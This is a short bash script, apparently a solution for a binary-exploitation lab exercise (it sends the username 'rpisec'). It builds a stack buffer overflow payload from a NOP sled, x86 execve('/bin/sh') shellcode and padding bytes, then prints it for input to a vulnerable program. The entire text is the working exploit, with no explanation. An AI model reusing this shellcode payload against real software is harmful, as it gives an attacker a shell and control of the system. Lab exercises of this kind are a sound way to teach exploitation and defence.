#!/bin/bash

username=`printf "rpisec"`
nopsled=`printf "%.s\x90" {1..12}`
pattern=`printf "%.sA" {1..213}`
payload=`printf "%.sB" {1..80}`
shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`

echo $username$nopsled$shellcode$pattern$payload
